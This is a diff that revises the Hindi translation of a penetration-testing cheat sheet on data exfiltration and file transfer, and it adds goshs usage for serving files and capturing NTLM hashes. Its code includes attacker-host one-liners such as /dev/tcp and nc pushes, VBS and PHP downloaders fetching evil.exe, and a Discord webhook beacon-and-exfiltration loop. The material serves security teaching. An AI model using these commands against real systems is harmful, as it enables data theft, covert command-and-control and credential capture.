@@ -3,15 +3,15 @@
 {{#include ../banners/hacktricks-training.md}}
 
 > [!TIP]
-> end-to-end उदाहरण के लिए, जिसमें loot को `C:\Users\Public` में स्टेज किया जाता है और Rclone के साथ इसे exfiltrating कर वैध backups की नकल की जाती है, नीचे दिए गए workflow की समीक्षा करें।
+> वैध बैकअप्स की नकल करने के लिए `C:\Users\Public` में loot को staging करने और Rclone के साथ उसे exfiltrate करने के end-to-end example के लिए, नीचे दिए गए workflow की समीक्षा करें।
 
 {{#ref}}
 ../windows-hardening/windows-local-privilege-escalation/dll-hijacking/advanced-html-staged-dll-sideloading.md
 {{#endref}}
 
-## Commonly whitelisted domains to exfiltrate information
+## सूचना exfiltrate करने के लिए आम तौर पर whitelisted domains
 
-जाँचें [https://lots-project.com/](https://lots-project.com/) ताकि commonly whitelisted domains मिल सकें जिनका दुरुपयोग किया जा सकता है
+दुरुपयोग किए जा सकने वाले आम तौर पर whitelisted domains खोजने के लिए [https://lots-project.com/](https://lots-project.com/) देखें
 
 ## Copy\&Paste Base64
 
@@ -20,7 +20,7 @@
 base64 -w0 <file> #Encode file
 base64 -d file #Decode file
 ```
-**Windows**
+**विंडोज**
 ```
 certutil -encode payload.dll payload.b64
 certutil -decode payload.b64 payload.dll
@@ -49,11 +49,11 @@ Start-BitsTransfer -Source $url -Destination $output
 #OR
 Start-BitsTransfer -Source $url -Destination $output -Asynchronous
 ```
-### फ़ाइलें अपलोड करें
+### फाइलें अपलोड करें
 
 - [**SimpleHttpServerWithFileUploads**](https://gist.github.com/UniIsland/3346170)
 - [**SimpleHttpServer printing GET and POSTs (also headers)**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
-- Python मॉड्यूल [uploadserver](https://pypi.org/project/uploadserver/):
+- Python module [uploadserver](https://pypi.org/project/uploadserver/):
 ```bash
 # Listen to files
 python3 -m pip install --user uploadserver
@@ -107,14 +107,47 @@ if __name__ == "__main__":
 app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
 ###
 ```
+### goshs
+
+[goshs](https://github.com/patrickhener/goshs) `python3 -m http.server` का एक single-binary replacement है
+जिसमें upload, download, WebDAV, SFTP, SMB, TLS, authentication, share links,
+और OOB collaboration features (DNS, SMTP, NTLM hash capture) शामिल हैं।
+```bash
+# Serve current directory on port 8000
+goshs
+
+# Serve with HTTPS (self-signed)
+goshs -s -ss
+
+# Serve with basic auth
+goshs -b user:password
+
+# Upload-only mode
+goshs -uo
+
+# Read-only mode
+goshs -ro
+
+# Capture SMB NTLM hashes
+goshs -smb -smb-domain CORP
+
+# DNS callback server
+goshs -dns -dns-ip 10.10.10.10
+
+# SMTP callback server
+goshs -smtp -smtp-domain [REDACTED]
+
+# Tunnel via localhost.run (no port forwarding needed)
+goshs -tunnel
+```
 ## Webhooks (Discord/Slack/Teams) for C2 & Data Exfiltration
 
-Webhooks write-only HTTPS endpoints होते हैं जो JSON और वैकल्पिक file parts स्वीकार करते हैं। इन्हें आमतौर पर trusted SaaS domains पर अनुमति दी जाती है और इन्हें OAuth/API keys की ज़रूरत नहीं होती, जिससे ये low-friction beaconing और exfiltration के लिए उपयोगी होते हैं।
+Webhooks write-only HTTPS endpoints हैं जो JSON और optional file parts accept करते हैं। इन्हें आम तौर पर trusted SaaS domains के लिए allowed किया जाता है और इनमें कोई OAuth/API keys की जरूरत नहीं होती, जिससे ये low-friction beaconing और exfiltration के लिए useful होते हैं।
 
 Key ideas:
-- Endpoint: Discord उपयोग करता है https://discord.com/api/webhooks/<id>/<token>
-- POST multipart/form-data के साथ एक पार्ट जिसका नाम payload_json है और जिसमें {"content":"..."} होता है, और वैकल्पिक file part(s) जिनका नाम file होता है।
-- Operator loop pattern: periodic beacon -> directory recon -> targeted file exfil -> recon dump -> sleep. HTTP 204 NoContent/200 OK डिलीवरी की पुष्टि करते हैं।
+- Endpoint: Discord uses https://discord.com/api/webhooks/<id>/<token>
+- POST multipart/form-data with a part named payload_json containing {"content":"..."} and optional file part(s) named file.
+- Operator loop pattern: periodic beacon -> directory recon -> targeted file exfil -> recon dump -> sleep. HTTP 204 NoContent/200 OK confirm delivery.
 
 PowerShell PoC (Discord):
 ```powershell
@@ -184,9 +217,9 @@ Send-DiscordFile -Path $tmp -Name "recon.txt"
 Start-Sleep -Seconds 20
 }
 ```
-नोट:
-- समान पैटर्न अन्य सहयोगी प्लेटफ़ॉर्मों (Slack/Teams) पर भी लागू होते हैं जो उनके incoming webhooks का उपयोग करते हैं; URL और JSON schema के अनुसार समायोजित करें।
-- Discord Desktop के cache artifacts और webhook/API recovery के DFIR के लिए, देखें:
+नोट्स:
+- समान पैटर्न अन्य collaboration platforms (Slack/Teams) पर भी उनके incoming webhooks के साथ लागू होते हैं; URL और JSON schema को accordingly adjust करें।
+- Discord Desktop cache artifacts और webhook/API recovery की DFIR के लिए, देखें:
 
 {{#ref}}
 ../generic-methodologies-and-resources/basic-forensic-methodology/specific-software-file-type-tricks/discord-cache-forensics.md
@@ -199,12 +232,12 @@ Start-Sleep -Seconds 20
 pip3 install pyftpdlib
 python3 -m pyftpdlib -p 21
 ```
-### FTP server (NodeJS)
+### FTP सर्वर (NodeJS)
 ```
 sudo npm install -g ftp-srv --save
 ftp-srv ftp://0.0.0.0:9876 --root /tmp
 ```
-### FTP server (pure-ftp)
+### FTP सर्वर (pure-ftp)
 ```bash
 apt-get update && apt-get install pure-ftp
 ```
@@ -235,14 +268,14 @@ ftp -n -v -s:ftp.txt
 ```
 ## SMB
 
-Kali को server के रूप में
+Kali as server
 ```bash
 kali_op1> impacket-smbserver -smb2support kali `pwd` # Share current directory
 kali_op2> smbserver.py -smb2support name /path/folder # Share a folder
 #For new Win10 versions
 impacket-smbserver -smb2support -user test -password test test `pwd`
 ```
-या smb शेयर **samba का उपयोग करके**:
+या **samba** का उपयोग करके एक smb share बनाएं:
 ```bash
 apt-get install samba
 mkdir /tmp/smb
@@ -257,7 +290,7 @@ guest ok = Yes
 #Start samba
 service smbd restart
 ```
-विंडोज़
+Windows
 ```bash
 CMD-Wind> \\10.10.14.14\path\to\exe
 CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentials
@@ -265,15 +298,25 @@ CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentia
 WindPS-1> New-PSDrive -Name "new_disk" -PSProvider "FileSystem" -Root "\\10.10.14.9\kali"
 WindPS-2> cd new_disk:
 ```
+### goshs
+[goshs](https://github.com/patrickhener/goshs) एक single-binary alternative है
+जो SMB के over files serve करता है और connecting clients से NetNTLMv2 hashes capture करता है:
+```bash
+# Start SMB server with NTLM hash capture
+goshs -smb -smb-domain CORP
+
+# Also works for plain HTTP file serving
+goshs
+```
 ## SCP
 
-attacker के पास SSHd चल रहा होना चाहिए।
+हमलावर के पास SSHd running होना चाहिए।
 ```bash
 scp <username>@<Attacker_IP>:<directory>/<filename>
 ```
 ## SSHFS
 
-यदि लक्षित सिस्टम पर SSH उपलब्ध है, तो हमलावर उस सिस्टम की किसी डायरेक्टरी को अपने सिस्टम पर माउंट कर सकता है।
+यदि victim के पास SSH है, तो attacker victim से एक directory को attacker पर mount कर सकता है।
 ```bash
 sudo apt-get install sshfs
 sudo mkdir /mnt/sshfs
@@ -286,12 +329,12 @@ nc -vn <IP> 4444 < exfil_file
 ```
 ## /dev/tcp
 
-### victim से फ़ाइल डाउनलोड करें
+### पीड़ित से फ़ाइल डाउनलोड करें
 ```bash
 nc -lvnp 80 > file #Inside attacker
 cat /path/file > /dev/tcp/10.10.10.10/80 #Inside victim
 ```
-### फ़ाइल को victim पर अपलोड करें
+### Victim पर file upload करें
 ```bash
 nc -w5 -lvnp 80 < file_to_send.txt # Inside attacker
 # Inside victim
@@ -320,33 +363,46 @@ sniff(iface="tun0", prn=process_packet)
 ```
 ## **SMTP**
 
-यदि आप किसी SMTP server को डेटा भेज सकते हैं, तो आप python के साथ डेटा प्राप्त करने के लिए एक SMTP बना सकते हैं:
+यदि आप किसी SMTP server को data भेज सकते हैं, तो आप python के साथ data receive करने के लिए एक SMTP बना सकते हैं:
 ```bash
 sudo python -m smtpd -n -c DebuggingServer :25
 ```
+### goshs
+
+[goshs](https://github.com/patrickhener/goshs) OOB exfiltration scenarios के दौरान email callbacks को पकड़ने के लिए एक जल्दी SMTP server चला सकता है:
+```bash
+# Start SMTP callback server
+goshs -smtp -smtp-domain [REDACTED]
+```
+प्राप्त ईमेल और callbacks सीधे terminal output में दिखाए जाते हैं।
+पूर्ण OOB coverage के लिए DNS callback server के साथ संयोजित किया जा सकता है:
+```bash
+# DNS + SMTP combined
+goshs -dns -dns-ip 10.10.10.10 -smtp -smtp-domain [REDACTED]
+```
 ## TFTP
 
-डिफ़ॉल्ट रूप से XP और 2003 में (अन्य में इसे इंस्टॉलेशन के दौरान स्पष्ट रूप से जोड़ना होता है)
+डिफ़ॉल्ट रूप से XP और 2003 में (अन्य में इसे installation के दौरान explicitly जोड़ना पड़ता है)
 
-Kali में, **start TFTP server**:
+Kali में, **TFTP server start करें**:
 ```bash
 #I didn't get this options working and I prefer the python option
 mkdir /tftp
 atftpd --daemon --port 69 /tftp
 cp /path/tp/nc.exe /tftp
 ```
-**TFTP सर्वर python में:**
+**python में TFTP server:**
 ```bash
 pip install ptftpd
 ptftpd -p 69 tap0 . # ptftp -p <PORT> <IFACE> <FOLDER>
 ```
-**victim** में, Kali सर्वर से कनेक्ट करें:
+In **victim**, Kali server से connect करें:
 ```bash
 tftp -i <KALI-IP> get nc.exe
 ```
 ## PHP
 
-PHP oneliner से फ़ाइल डाउनलोड करें:
+PHP oneliner से एक file download करें:
 ```bash
 echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
 ```
@@ -354,7 +410,7 @@ echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', '
 ```bash
 Attacker> python -m SimpleHTTPServer 80
 ```
-**शिकार**
+**पीड़ित**
 ```bash
 echo strUrl = WScript.Arguments.Item(0) > wget.vbs
 echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
@@ -388,25 +444,22 @@ cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
 ```
 ## Debug.exe
 
-`debug.exe` प्रोग्राम न केवल binaries का निरीक्षण करने की अनुमति देता है बल्कि इसमें **hex से उन्हें पुनर्निर्मित करने की क्षमता** भी है। 
-
-इसका मतलब है कि किसी बाइनरी का hex प्रदान करके, `debug.exe` बाइनरी फ़ाइल जनरेट कर सकता है। 
-
-हालाँकि, यह ध्यान देने योग्य है कि debug.exe में **आकार में 64 kb तक की फाइलों को असेंबल करने की सीमा** है।
+`debug.exe` प्रोग्राम न केवल binaries का inspection करने देता है, बल्कि उन्हें **hex से rebuild** करने की **capability** भी रखता है। इसका मतलब है कि binary का hex देकर, `debug.exe` binary file generate कर सकता है। हालांकि, यह ध्यान रखना महत्वपूर्ण है कि debug.exe की **limitation** है कि वह 64 kb तक की size वाली files ही assemble कर सकता है।
 ```bash
 # Reduce the size
 upx -9 nc.exe
 wine exe2bat.exe nc.exe nc.txt
 ```
-फिर उस टेक्स्ट को windows-shell में कॉपी-पेस्ट करें और nc.exe नाम की एक फ़ाइल बन जाएगी।
+फिर उस टेक्स्ट को windows-shell में copy-paste करें और एक file जिसका नाम nc.exe होगा, बनाई जाएगी।
 
 - [https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)
 
 ## DNS
 
 - [https://github.com/Stratiz/DNS-Exfil](https://github.com/Stratiz/DNS-Exfil)
+- [https://github.com/patrickhener/goshs](https://github.com/patrickhener/goshs)
 
-## संदर्भ
+## References
 
 - [Discord as a C2 and the cached evidence left behind](https://www.pentestpartners.com/security-blog/discord-as-a-c2-and-the-cached-evidence-left-behind/)
 - [Discord Webhooks – Execute Webhook](https://discord.com/developers/docs/resources/webhook#execute-webhook)
